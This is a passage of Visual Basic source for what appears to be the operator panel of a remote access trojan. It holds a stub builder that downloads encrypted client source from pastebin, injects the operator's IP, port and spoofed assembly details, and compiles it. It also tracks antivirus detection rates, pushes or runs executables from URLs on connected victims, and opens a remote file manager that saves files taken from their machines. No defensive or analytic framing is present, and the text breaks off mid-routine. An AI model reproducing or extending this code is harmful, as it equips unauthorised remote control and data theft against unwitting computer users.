            Me.ComboBox3.Items.AddRange(New Object() {"Afghanistan", "Albania", "Algeria", "American samoa", "Andorra", "Angola", "Anguilla", "Antarctica", "Antigua and barbuda", "Argentina", "Armenia", "Aruba", "Australia", "Austria", "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bermuda", "Bhutan", "Bolivia", "Bosnia and herzegowina", "Botswana", "Bouvet island", "Brazil", "British indian ocean territory", "Brunei darussalam", "Bulgaria", "Burkina faso", "Burundi", "Cambodia", "Cameroon", "Canada", "Cape verde", "Cayman islands", "Central african republic", "Chad", "Chile", "China", "Christmas island", "Cocos (keeling) islands", "Colombia", "Comoros", "Congo", "Congo, the drc", "Cook islands", "Costa rica", "Cote d'ivoire", "Croatia (local name: hrvatska)", "Cuba", "Cyprus", "Czech republic", "Denmark", "Djibouti", "Dominica", "Dominican republic", "East timor", "Ecuador", "Egypt", "El salvador", "Equatorial guinea", "Eritrea", "Estonia", "Ethiopia", "Falkland islands (malvinas)", "Faroe islands", "Fiji", "Finland", "France", "France, metropolitan", "French guiana", "French polynesia", "French southern territories", "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Gibraltar", "Greece", "Greenland", "Grenada", "Guadeloupe", "Guam", "Guatemala", "Guinea", "Guinea-bissau", "Guyana", "Haiti", "Heard and mc donald islands", "Holy see (vatican city state)", "Honduras", "Hong kong", "Hungary", "Iceland", "India", "Indonesia", "Iran (islamic republic of)", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Korea, d.p.r.o.", "Korea, republic of", "Kuwait", "Kyrgyzstan", "Laos ", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libyan arab jamahiriya", "Liechtenstein", "Lithuania", "Luxembourg", "Macau", "Macedonia", "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall islands", "Martinique", "Mauritania", "Mauritius", "Mayotte", "Mexico", "Micronesia, federated states of", "Moldova, republic of", "Monaco", "Mongolia", "Montenegro", "Montserrat", "Morocco", "Mozambique", "Myanmar (burma) ", "Namibia", "Nauru", "Nepal", "Netherlands", "Netherlands antilles", "New caledonia", "New zealand", "Nicaragua", "Niger", "Nigeria", "Niue", "Norfolk island", "Northern mariana islands", "Norway", "Oman", "Pakistan", "Palau", "Panama", "Papua new guinea", "Paraguay", "Peru", "Philippines", "Pitcairn", "Poland", "Portugal", "Puerto rico", "Qatar", "Reunion", "Romania", "Russian federation", "Rwanda", "Saint kitts and nevis", "Saint lucia", "Saint vincent and the grenadines", "Samoa", "San marino", "Sao tome and principe", "Saudi arabia", "Senegal", "Serbia", "Seychelles", "Sierra leone", "Singapore", "Slovakia (slovak republic)", "Slovenia", "Solomon islands", "Somalia", "South africa", "South sudan", "South georgia and south s.s.", "Spain", "Sri lanka", "St. helena", "St. pierre and miquelon", "Sudan", "Suriname", "Svalbard and jan mayen islands", "Swaziland", "Sweden", "Switzerland", "Syrian arab republic", "Taiwan, province of china", "Tajikistan", "Tanzania, united republic of", "Thailand", "Togo", "Tokelau", "Tonga", "Trinidad and tobago", "Tunisia", "Turkey", "Turkmenistan", "Turks and caicos islands", "Tuvalu", "Uganda", "Ukraine", "United arab emirates", "United kingdom", "United states", "U.s. minor islands", "Uruguay", "Uzbekistan", "Vanuatu", "Venezuela", "Viet nam", "Virgin islands (british)", "Virgin islands (u.s.)", "Wallis and futuna islands", "Western sahara", "Yemen", "Zambia", "Zimbabwe"})
        ElseIf (Me.ComboBox2.SelectedIndex = 2) Then
            Dim str As String = Interaction.InputBox("Please enter a valid ClientID!", "OnConnect - ClientID", "", -1, -1)
            If ((Not str Is Nothing) AndAlso (str.Length <> 0)) Then
                Select Case Me.ComboBox1.SelectedIndex
                    Case 0
                        Me.execurl(("ClientID: " & str))
                        Exit Select
                    Case 1
                        Me.execfile(("ClientID: " & str))
                        Exit Select
                    Case 2
                        Me.updateurl(("ClientID: " & str))
                        Exit Select
                    Case 3
                        Me.updatefile(("ClientID: " & str))
                        Exit Select
                    Case 4
                        Me.InputBx(("ClientID: " & str))
                        Exit Select
                    Case 5
                        Me.msbox(("ClientID: " & str))
                        Exit Select
                    Case 6
                        Dim item4 As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 6)
                        item4.SubItems.Add("Disconnect")
                        item4.SubItems.Add(("ClientID: " & str))
                        item4 = Nothing
                        Exit Select
                    Case 7
                        Dim item5 As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 7)
                        item5.SubItems.Add("Uninstall")
                        item5.SubItems.Add(("ClientID: " & str))
                        item5 = Nothing
                        Exit Select
                    Case 8
                        Dim item6 As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 8)
                        item6.SubItems.Add("Restart")
                        item6.SubItems.Add(("ClientID: " & str))
                        item6 = Nothing
                        Exit Select
                End Select
            End If
        ElseIf (Me.ComboBox2.SelectedIndex = 3) Then
            Me.ComboBox3.Enabled = True
            Me.ComboBox3.Items.Clear()
            Me.ComboBox3.Items.AddRange(New Object() {"Windows XP", "Windows Vista", "Windows 7", "Windows 8"})
        ElseIf (Me.ComboBox2.SelectedIndex = 4) Then
            Me.ComboBox3.Enabled = True
            Me.ComboBox3.Items.Clear()
            Me.ComboBox3.Items.AddRange(New Object() {"User", "Admin", "Guest"})
        End If
    End Sub

    Private Sub ComboBox3_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox3.SelectedIndexChanged
        If (Me.ComboBox2.SelectedItem.ToString = "Location") Then
            Select Case Me.ComboBox1.SelectedIndex
                Case 0
                    Me.execurl(("Location: " & Me.ComboBox3.SelectedItem.ToString))
                    Exit Select
                Case 1
                    Me.execfile(("Location: " & Me.ComboBox3.SelectedItem.ToString))
                    Exit Select
                Case 2
                    Me.updateurl(("Location: " & Me.ComboBox3.SelectedItem.ToString))
                    Exit Select
                Case 3
                    Me.updatefile(("Location: " & Me.ComboBox3.SelectedItem.ToString))
                    Exit Select
                Case 4
                    Me.InputBx(("Location: " & Me.ComboBox3.SelectedItem.ToString))
                    Exit Select
                Case 5
                    Me.msbox(("Location: " & Me.ComboBox3.SelectedItem.ToString))
                    Exit Select
                Case 6
                    Dim item As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 6)
                    item.SubItems.Add("Disconnect")
                    item.SubItems.Add(("Location: " & Me.ComboBox3.SelectedItem.ToString))
                    item = Nothing
                    Exit Select
                Case 7
                    Dim item2 As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 7)
                    item2.SubItems.Add("Uninstall")
                    item2.SubItems.Add(("Location: " & Me.ComboBox3.SelectedItem.ToString))
                    item2 = Nothing
                    Exit Select
                Case 8
                    Dim item3 As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 8)
                    item3.SubItems.Add("Restart")
                    item3.SubItems.Add(("Location: " & Me.ComboBox3.SelectedItem.ToString))
                    item3 = Nothing
                    Exit Select
            End Select
        ElseIf (Me.ComboBox2.SelectedItem.ToString = "Operating System") Then
            Select Case Me.ComboBox1.SelectedIndex
                Case 0
                    Me.execurl(("OS: " & Me.ComboBox3.SelectedItem.ToString))
                    Exit Select
                Case 1
                    Me.execfile(("OS: " & Me.ComboBox3.SelectedItem.ToString))
                    Exit Select
                Case 2
                    Me.updateurl(("OS: " & Me.ComboBox3.SelectedItem.ToString))
                    Exit Select
                Case 3
                    Me.updatefile(("OS: " & Me.ComboBox3.SelectedItem.ToString))
                    Exit Select
                Case 4
                    Me.InputBx(("OS: " & Me.ComboBox3.SelectedItem.ToString))
                    Exit Select
                Case 5
                    Me.msbox(("OS: " & Me.ComboBox3.SelectedItem.ToString))
                    Exit Select
                Case 6
                    Dim item4 As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 6)
                    item4.SubItems.Add("Disconnect")
                    item4.SubItems.Add(("OS: " & Me.ComboBox3.SelectedItem.ToString))
                    item4 = Nothing
                    Exit Select
                Case 7
                    Dim item5 As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 7)
                    item5.SubItems.Add("Uninstall")
                    item5.SubItems.Add(("OS: " & Me.ComboBox3.SelectedItem.ToString))
                    item5 = Nothing
                    Exit Select
                Case 8
                    Dim item6 As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 8)
                    item6.SubItems.Add("Restart")
                    item6.SubItems.Add(("OS: " & Me.ComboBox3.SelectedItem.ToString))
                    item6 = Nothing
                    Exit Select
            End Select
        ElseIf (Me.ComboBox2.SelectedItem.ToString = "Privilegs") Then
            Select Case Me.ComboBox1.SelectedIndex
                Case 0
                    Me.execurl(("Privilegs: " & Me.ComboBox3.SelectedItem.ToString))
                    Exit Select
                Case 1
                    Me.execfile(("Privilegs: " & Me.ComboBox3.SelectedItem.ToString))
                    Exit Select
                Case 2
                    Me.updateurl(("Privilegs: " & Me.ComboBox3.SelectedItem.ToString))
                    Exit Select
                Case 3
                    Me.updatefile(("Privilegs: " & Me.ComboBox3.SelectedItem.ToString))
                    Exit Select
                Case 4
                    Me.InputBx(("Privilegs: " & Me.ComboBox3.SelectedItem.ToString))
                    Exit Select
                Case 5
                    Me.msbox(("Privilegs: " & Me.ComboBox3.SelectedItem.ToString))
                    Exit Select
                Case 6
                    Dim item7 As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 6)
                    item7.SubItems.Add("Disconnect")
                    item7.SubItems.Add(("Privilegs: " & Me.ComboBox3.SelectedItem.ToString))
                    item7 = Nothing
                    Exit Select
                Case 7
                    Dim item8 As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 7)
                    item8.SubItems.Add("Uninstall")
                    item8.SubItems.Add(("Privilegs: " & Me.ComboBox3.SelectedItem.ToString))
                    item8 = Nothing
                    Exit Select
                Case 8
                    Dim item9 As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 8)
                    item9.SubItems.Add("Restart")
                    item9.SubItems.Add(("Privilegs: " & Me.ComboBox3.SelectedItem.ToString))
                    item9 = Nothing
                    Exit Select
            End Select
        End If
        Me.ComboBox3.Enabled = False
    End Sub
    Private Sub Compile(ByVal path As String)
        Try
            Me.Invoke(New DelegateAddOutput(AddressOf Me.AddOutput), New Object() {"Initializing Build..."})
            Dim source As String = Conversions.ToString(FormMain.RijndaelDecrypt(New WebClient().DownloadString("http://pastebin.com/raw.php?i=Y7A9LibH"), "308c036ab4ae32ff202d417d1e15cb667326201f4754644509b9079a81")).Replace("127.0.0.1", Me.tb_ip.Text).Replace("4432", Conversions.ToString(Me.nud_port.Value)).Replace("CLIENTID", Me.tb_clientid.Text).Replace("Single_Mutex_App_Instance", Me.TB_Mutex.Text).Replace("ASSEMBLYTITLE", Me.tb_assemblytitle.Text).Replace("ASSEMBLYDESCRIPTION", Me.tb_assemblydescription.Text).Replace("ASSEMBLYCOMPANY", Me.tb_assemblycompany.Text).Replace("ASSEMBLYPRODUCT", Me.tb_assemblyproduct.Text).Replace("ASSEMBLYCOPYRIGHT", Me.tb_assemblycopyright.Text).Replace("ASSEMBLYTRADEMARK", Me.tb_assemblytrademark.Text).Replace("3.5.2.4", String.Format("{0}.{1}.{2}.{3}", New Object() {Me.NumericUpDown9.Value, Me.NumericUpDown2.Value, Me.NumericUpDown3.Value, Me.NumericUpDown4.Value})).Replace("0.0.0.0", String.Format("{0}.{1}.{2}.{3}", New Object() {Me.NumericUpDown8.Value, Me.NumericUpDown7.Value, Me.NumericUpDown6.Value, Me.NumericUpDown5.Value})).Replace("L$01", Conversions.ToString(Me.CheckBox1.Checked)).Replace("L$02", Conversions.ToString(Me.RadioButton1.Checked)).Replace("L$03", Conversions.ToString(Me.RadioButton2.Checked)).Replace("L$04", Conversions.ToString(Me.RadioButton3.Checked)).Replace("L$05", Me.TextBox1.Text).Replace("L$06", Conversions.ToString(Interaction.IIf((Strings.Right(Me.TextBox2.Text, 4) = ".exe"), Me.TextBox2.Text, (Me.TextBox2.Text & ".exe")))).Replace("L$07", Conversions.ToString(Me.CheckBox2.Checked)).Replace("L$08", Conversions.ToString(Interaction.IIf((Strings.Right(Me.TextBox3.Text, 1) = "\"), Me.TextBox3.Text, (Me.TextBox3.Text & "\")))).Replace("L$09", Conversions.ToString(Me.CheckBox6.Checked)).Replace("L$10", Conversions.ToString(Me.CheckBox3.Checked)).Replace("L$11", Conversions.ToString(Me.CheckBox5.Checked)).Replace("L$12", Conversions.ToString(Me.CheckBox7.Checked)).Replace("L$13", Conversions.ToString(Convert.ToInt32(Me.NumericUpDown1.Value)))
            Me.Invoke(New DelegateAddOutput(AddressOf Me.AddOutput), New Object() {"Writing parameter to stub..."})
            Dim compiler As ICodeCompiler = New VBCodeProvider().CreateCompiler
            Dim options As New CompilerParameters
            options.ReferencedAssemblies.Add("System.dll")
            options.ReferencedAssemblies.Add("System.Windows.Forms.dll")
            options.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
            options.ReferencedAssemblies.Add("System.Management.dll")
            options.ReferencedAssemblies.Add("System.Drawing.dll")
            options.ReferencedAssemblies.Add("System.ServiceProcess.dll")
            options.ReferencedAssemblies.Add("AForge.dll")
            options.ReferencedAssemblies.Add("AForge.Controls.dll")
            options.ReferencedAssemblies.Add("AForge.Video.DirectShow.dll")
            options.ReferencedAssemblies.Add("AForge.Video.dll")
            options.GenerateExecutable = True
            options.OutputAssembly = path
            options.CompilerOptions = "/target:winexe /platform:x86 /optimize+ /filealign:512"
            Dim parameters2 As CompilerParameters = options
            parameters2.CompilerOptions = Conversions.ToString(Operators.AddObject(parameters2.CompilerOptions, Interaction.IIf(Operators.ConditionalCompareObjectEqual(Me.PictureBox1.Tag, "", False), "", Operators.ConcatenateObject(" /win32icon:", Me.PictureBox1.Tag))))
            Dim results As CompilerResults = compiler.CompileAssemblyFromSource(options, source)
            Me.Invoke(New DelegateAddOutput(AddressOf Me.AddOutput), New Object() {"Stub builded..."})
            Me.Invoke(New DelegateAddOutput(AddressOf Me.AddOutput), New Object() {"Merging Assemblies..."})
            Dim startInfo As New ProcessStartInfo("ILMerge.exe")
            startInfo.Arguments = String.Concat(New String() {"/target:winexe /out:""", path, """ """, path, """ AForge.Controls.dll AForge.dll AForge.Video.DirectShow.dll AForge.Video.dll"})
            startInfo.WindowStyle = ProcessWindowStyle.Hidden
            Process.Start(startInfo)
            Thread.Sleep(&HBB8)
            Me.Invoke(New DelegateAddOutput(AddressOf Me.AddOutput), New Object() {"Finished build !"})
            File.Delete(path.Replace(".exe", ".pdb"))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Me.Invoke(New DelegateAddOutput(AddressOf Me.AddOutput), New Object() {exception.Message})
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Public Function CountCharacter(ByVal value As String, ByVal ch As Char) As Integer
        Dim num As Integer = 0
        Dim str As String = value
        Dim num3 As Integer = 0
        Dim length As Integer = str.Length
        Do While (num3 < length)
            Dim ch2 As Char = str.Chars(num3)
            If (ch2 = ch) Then
                num += 1
            End If
            num3 += 1
        Loop
        Return num
    End Function

    Private Sub CountDetection()
        Try
            Dim num As Integer = 0
            Dim num3 As Integer = (Me.LV_Scanner.Items.Count - 1)
            Dim i As Integer = 0
            Do While (i <= num3)
                If (Me.LV_Scanner.Items.Item(i).SubItems.Item(1).Text <> "OK") Then
                    num += 1
                End If
                i += 1
            Loop
            Me.Label_Detection.Text = String.Format("Detection Rate: {0}/39", num)
            My.Computer.Audio.Play(My.Resources.Converted_file_04e35b84, AudioPlayMode.Background)
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub DisconnectToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DisconnectToolStripMenuItem.Click
        Dim enumerator As IEnumerator(Of BetterListViewItem)
        Try
            enumerator = Me.LV_Clients.SelectedItems.GetEnumerator
            Dim obj2 As Object = Me.LV_Clients.SelectedItems.Item(0)
            Do While enumerator.MoveNext
                Try
                    Dim current As BetterListViewItem = enumerator.Current
                    Dim dr As DialogResult = MessageBox.Show("Are you sure to want to Disconnect Server ?", "Disconnect", MessageBoxButtons.YesNo)
                    If dr = DialogResult.Yes Then
                        NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {New Pack().Serialize(New Object() {CByte(&H34)})}, Nothing, Nothing, Nothing, True)
                        For Each i As BetterListViewItem In LV_Clients.SelectedItems
                            LV_Clients.Items.Remove(i)
                        Next
                    End If
                    Continue Do
                Catch ex As Exception
                    Continue Do
                End Try
            Loop
        Finally
        End Try
    End Sub
    Private Sub DownloadFile(ByVal name As String, ByVal client As ServerClient, ByVal byt As Byte())
        If Not My.Computer.FileSystem.DirectoryExists(String.Format("{0}\Files\", FileSystem.CurDir)) Then
            Directory.CreateDirectory(String.Format("{0}\Files\", FileSystem.CurDir))
        End If
        If Not My.Computer.FileSystem.DirectoryExists(String.Format("{0}\Files\{1}\", FileSystem.CurDir, client.EndPoint.Address.ToString)) Then
            Directory.CreateDirectory(String.Format("{0}\Files\{1}\", FileSystem.CurDir, client.EndPoint.Address.ToString))
        End If
        File.WriteAllBytes(String.Format("{0}\Files\{1}\{2}", FileSystem.CurDir, client.EndPoint.Address.ToString, name), byt)
    End Sub

   
    Private Sub execfile(ByVal actionfor As String)
        Using dialog As OpenFileDialog = New OpenFileDialog
            Dim dialog2 As OpenFileDialog = dialog
            dialog2.Filter = "Executables | *.exe"
            dialog2.InitialDirectory = Application.StartupPath
            dialog2.Multiselect = False
            dialog2.Title = "Select a file..."
            If (dialog2.ShowDialog = DialogResult.OK) Then
                dialog2 = Nothing
                Dim item As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 1)
                item.SubItems.Add(dialog.FileName)
                item.SubItems.Add(actionfor)
                item = Nothing
            End If
        End Using
    End Sub

    Private Sub execurl(ByVal actionfor As String)
        Dim str As String = Interaction.InputBox("Please enter a valid direct .exe link that you want to be executed on the remote machine!", "Execute File from URL", "", -1, -1)
        If ((Not str Is Nothing) AndAlso (str.Length <> 0)) Then
            Dim item As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 0)
            item.SubItems.Add(str)
            item.SubItems.Add(actionfor)
            item = Nothing
        End If
    End Sub

    Private Sub FileManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FileManagerToolStripMenuItem.Click
        Try
            My.Forms.FileManager.client = DirectCast(Me.LV_Clients.SelectedItems.Item(0).Tag, ServerClient)
            My.Forms.FileManager.Text = ("File Manager - " & NewLateBinding.LateGet(NewLateBinding.LateGet(Me.LV_Clients.SelectedItems.Item(0).Tag, Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString)
            My.Forms.FileManager.Show()
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub
    Public Function Flag2Img(ByVal twoletteriso As String) As Object
        Select Case twoletteriso
            Case "ad"
                Return 0
            Case "ae"
                Return 1
            Case "af"
                Return 2
            Case "ag"
                Return 3
            Case "ai"
                Return 4
            Case "al"
                Return 5
            Case "am"
                Return 6
            Case "an"
                Return 7
            Case "ao"
                Return 8
            Case "ar"
                Return 9
            Case "as"
                Return 10
            Case "at"
                Return 11
            Case "au"
                Return 12
            Case "aw"
                Return 13
            Case "ax"
                Return 14
            Case "az"
                Return 15
            Case "ba"
                Return &H10
            Case "bb"
                Return &H11
            Case "bd"
                Return &H12
            Case "be"
                Return &H13
            Case "bf"
                Return 20
            Case "bg"
                Return 21
            Case "bh"
                Return &H16
            Case "bi"
                Return 23
            Case "bj"
                Return &H18
            Case "bm"
                Return &H19
            Case "bn"
                Return 26
            Case "bo"
                Return 27
            Case "br"
                Return 28
            Case "bs"
                Return &H1D
            Case "bt"
                Return 30
            Case "bv"
                Return 31
            Case "bw"
                Return &H20
            Case "by"
                Return 33
            Case "bz"
                Return 34
            Case "ca"
                Return &H23
            Case "cc"
                Return 36
            Case "cd"
                Return &H25
            Case "cf"
                Return &H26
            Case "cg"
                Return &H27
            Case "ch"
                Return 40
            Case "ci"
                Return &H29
            Case "ck"
                Return &H2A
            Case "cl"
                Return &H2B
            Case "cm"
                Return &H2C
            Case "cn"
                Return &H2D
            Case "co"
                Return 46
            Case "cr"
                Return 47
            Case "cs"
                Return &H30
            Case "cu"
                Return 49
            Case "cv"
                Return 50
            Case "cx"
                Return 51
            Case "cy"
                Return &H34
            Case "cz"
                Return &H35
            Case "de"
                Return 54
            Case "dj"
                Return 55
            Case "dk"
                Return 56
            Case "dm"
                Return 57
            Case "do"
                Return 58
            Case "dz"
                Return 59
            Case "ec"
                Return 60
            Case "ee"
                Return 61
            Case "eg"
                Return 62
            Case "eh"
                Return 63
            Case "er"
                Return &H40
            Case "es"
                Return 65
            Case "et"
                Return &H42
            Case "fi"
                Return &H43
            Case "fj"
                Return &H44
            Case "fk"
                Return 69
            Case "fm"
                Return 70
            Case "fo"
                Return &H47
            Case "fr"
                Return &H48
            Case "ga"
                Return &H49
            Case "gb"
                Return &H4A
            Case "gd"
                Return &H4B
            Case "ge"
                Return &H4C
            Case "gf"
                Return &H4D
            Case "gh"
                Return &H4E
            Case "gi"
                Return &H4F
            Case "gl"
                Return 80
            Case "gm"
                Return &H51
            Case "gn"
                Return &H52
            Case "gp"
                Return &H53
            Case "gq"
                Return &H54
            Case "gr"
                Return &H55
            Case "gs"
                Return &H56
            Case "gt"
                Return &H57
            Case "gu"
                Return &H58
            Case "gw"
                Return &H59
            Case "gy"
                Return 90
            Case "hk"
                Return &H5B
            Case "hm"
                Return &H5C
            Case "hn"
                Return &H5D
            Case "hr"
                Return &H5E
            Case "ht"
                Return &H5F
            Case "hu"
                Return &H60
            Case "id"
                Return &H61
            Case "ie"
                Return &H62
            Case "il"
                Return &H63
            Case "in"
                Return 100
            Case "io"
                Return &H65
            Case "iq"
                Return &H66
            Case "ir"
                Return &H29
            Case "is"
                Return &H68
            Case "it"
                Return &H69
            Case "jm"
                Return &H6A
            Case "jo"
                Return 107
            Case "jp"
                Return 108
            Case "ke"
                Return &H6D
            Case "kg"
                Return 110
            Case "kh"
                Return 111
            Case "ki"
                Return 112
            Case "km"
                Return 113
            Case "kn"
                Return 114
            Case "kp"
                Return 115
            Case "kr"
                Return 116
            Case "kw"
                Return 117
            Case "ky"
                Return &H76
            Case "kz"
                Return &H77
            Case "la"
                Return 120
            Case "lb"
                Return 121
            Case "lc"
                Return 122
            Case "li"
                Return 123
            Case "lk"
                Return 124
            Case "lr"
                Return &H7D
            Case "ls"
                Return &H7E
            Case "lt"
                Return &H7F
            Case "lu"
                Return &H80
            Case "lv"
                Return &H81
            Case "ly"
                Return 130
            Case "ma"
                Return 131
            Case "mc"
                Return 132
            Case "md"
                Return &H85
            Case "me"
                Return &H86
            Case "mg"
                Return &H87
            Case "mh"
                Return &H88
            Case "mk"
                Return &H89
            Case "ml"
                Return &H8A
            Case "mm"
                Return &H8B
            Case "mn"
                Return 140
            Case "mo"
                Return &H8D
            Case "mp"
                Return &H8E
            Case "mq"
                Return &H8F
            Case "mr"
                Return &H90
            Case "ms"
                Return &H91
            Case "mt"
                Return &H92
            Case "mu"
                Return &H93
            Case "mv"
                Return &H94
            Case "mw"
                Return &H95
            Case "mx"
                Return 150
            Case "my"
                Return &H97
            Case "mz"
                Return &H98
            Case "na"
                Return &H99
            Case "nc"
                Return &H9A
            Case "ne"
                Return &H9B
            Case "nf"
                Return &H9C
            Case "ng"
                Return &H9D
            Case "ni"
                Return &H9E
            Case "nl"
                Return &H9F
            Case "no"
                Return 160
            Case "np"
                Return &HA1
            Case "nr"
                Return &HA2
            Case "nu"
                Return &HA3
            Case "nz"
                Return &HA4
            Case "om"
                Return &HA5
            Case "pa"
                Return &HA6
            Case "pe"
                Return &HA7
            Case "pf"
                Return &HA8
            Case "pg"
                Return &HA9
            Case "ph"
                Return 170
            Case "pk"
                Return &HAB
            Case "pl"
                Return &HAC
            Case "pm"
                Return &HAD
            Case "pn"
                Return &HAE
            Case "pr"
                Return &HAF
            Case "ps"
                Return &HB0
            Case "pt"
                Return &HB1
            Case "pw"
                Return &HB2
            Case "py"
                Return &HB3
            Case "qa"
                Return 180
            Case "re"
                Return &HB5
            Case "ro"
                Return &HB6
            Case "rs"
                Return &HB7
            Case "ru"
                Return &HB8
            Case "rw"
                Return &HB9
            Case "sa"
                Return &HBA
            Case "sb"
                Return &HBB
            Case "sc"
                Return &HBC
            Case "sd"
                Return &HBD
            Case "se"
                Return 190
            Case "sg"
                Return &HBF
            Case "sh"
                Return &HC0
            Case "si"
                Return &HC1
            Case "sj"
                Return &HC2
            Case "sk"
                Return &HC3
            Case "sl"
                Return &HC4
            Case "sm"
                Return &HC5
            Case "sn"
                Return &HC6
            Case "so"
                Return &HC7
            Case "sr"
                Return 200
            Case "st"
                Return &HC9
            Case "sv"
                Return &HCA
            Case "sy"
                Return &HCB
            Case "sz"
                Return &HCC
            Case "tc"
                Return &HCD
            Case "td"
                Return &HCE
            Case "tf"
                Return &HCF
            Case "tg"
                Return &HD0
            Case "th"
                Return &HD1
            Case "tj"
                Return 210
            Case "tk"
                Return &HD3
            Case "tl"
                Return &HD4
            Case "tm"
                Return &HD5
            Case "tn"
                Return &HD6
            Case "to"
                Return &HD7
            Case "tr"
                Return &HD8
            Case "tt"
                Return &HD9
            Case "tv"
                Return &HDA
            Case "tw"
                Return &HDB
            Case "tz"
                Return 220
            Case "ua"
                Return &HDD
            Case "ug"
                Return &HDE
            Case "um"
                Return &HDF
            Case "us"
                Return &HE0
            Case "uy"
                Return &HE1
            Case "uz"
                Return &HE2
            Case "va"
                Return &HE3
            Case "vc"
                Return &HE4
            Case "ve"
                Return &HE5
            Case "vg"
                Return 230
            Case "vi"
                Return &HE7
            Case "vn"
                Return &HE8
            Case "vu"
                Return &HE9
            Case "wf"
                Return &HEA
            Case "ws"
                Return &HEB
            Case "ye"
                Return &HEC
            Case "yt"
                Return &HED
            Case "za"
                Return &HEE
            Case "zm"
                Return &HEF
            Case "zw"
                Return 240
        End Select
        Return 241
    End Function
    Private Declare Ansi Function DragAcceptFiles Lib "shell32.dll" (hwnd As IntPtr, accept As Boolean) As Long
    Private Declare Ansi Function DragQueryFile Lib "shell32.dll" (hdrop As IntPtr, ifile As Integer, fname As StringBuilder, fnsize As Integer) As Integer
    Private Declare Ansi Sub DragFinish Lib "Shell32.dll" (hdrop As IntPtr)

    Private Sub FormMain_Load(sender As Object, e As EventArgs) Handles Me.Load
        Try
            Me.LV_Ports.Items.Item(0).Text = ((My.Settings.port))
            Me.cb_autolisten.Checked = My.Settings.autolistening
            Me.cb_notify.Checked = My.Settings.notify
            Me.cb_sound.Checked = My.Settings.sounds
            If My.Settings.autolistening Then
                Me.btn_startlistening_Click(RuntimeHelpers.GetObjectValue(sender), e)
            End If
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub FromFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromFileToolStripMenuItem.Click
        Try
            Dim obj2 As Object = Me.LV_Clients.SelectedItems.Item(0)
            Using dialog As OpenFileDialog = New OpenFileDialog
                Dim dialog2 As OpenFileDialog = dialog
                dialog2.Filter = "Executables | *.exe"
                dialog2.InitialDirectory = Application.StartupPath
                dialog2.Multiselect = False
                If (dialog2.ShowDialog = DialogResult.OK) Then
                    dialog2 = Nothing
                    Dim item As BetterListViewItem
                    For Each item In Me.LV_Clients.SelectedItems
                        NewLateBinding.LateCall(item.Tag, Nothing, "Send", New Object() {New Pack().Serialize(New Object() {CByte(55), File.ReadAllBytes(dialog.FileName)})}, Nothing, Nothing, Nothing, True)
                    Next
                End If
            End Using
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub FromFileToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromFileToolStripMenuItem1.Click
        Try
            Dim obj2 As Object = Me.LV_Clients.SelectedItems.Item(0)
            Using dialog As OpenFileDialog = New OpenFileDialog
                Dim dialog2 As OpenFileDialog = dialog
                dialog2.Filter = "Executables | *.exe"
                dialog2.InitialDirectory = Application.StartupPath
                dialog2.Multiselect = False
                If (dialog2.ShowDialog = DialogResult.OK) Then
                    dialog2 = Nothing
                    Dim item As BetterListViewItem
                    For Each item In Me.LV_Clients.SelectedItems
                        NewLateBinding.LateCall(item.Tag, Nothing, "Send", New Object() {New Pack().Serialize(New Object() {CByte(55), File.ReadAllBytes(dialog.FileName)})}, Nothing, Nothing, Nothing, True)
                    Next
                End If
            End Using
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub FromURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem.Click
        Try
            Dim obj2 As Object = Me.LV_Clients.SelectedItems.Item(0)
            Dim str As String = Interaction.InputBox("Please enter a direct link to an .exe!", "ExecuteFromURL", "", -1, -1)
            If ((Not str Is Nothing) AndAlso (str.Length <> 0)) Then
                Dim enumerator As IEnumerator(Of BetterListViewItem)
                Try
                    enumerator = Me.LV_Clients.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
